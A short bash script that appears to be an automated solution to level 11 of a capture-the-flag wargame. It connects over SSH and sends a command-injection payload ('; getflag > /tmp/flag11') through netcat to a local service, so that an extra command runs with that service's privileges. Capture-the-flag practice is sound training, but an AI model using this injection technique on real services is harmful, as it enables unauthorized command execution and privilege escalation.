#!/usr/bin/env bash

set -euo pipefail

PARENT_DIR="$(dirname "$0")"
UTILS_DIR="$PARENT_DIR/../utils"

PATH="$UTILS_DIR:$PATH"

host="$1"
port="$2"
pass="$3"

sshexec.sh "$host" "$port" level11 "$pass" 'set -e; nc localhost 5151 <<< "; getflag > /tmp/flag11" > /dev/null; cat /tmp/flag11'
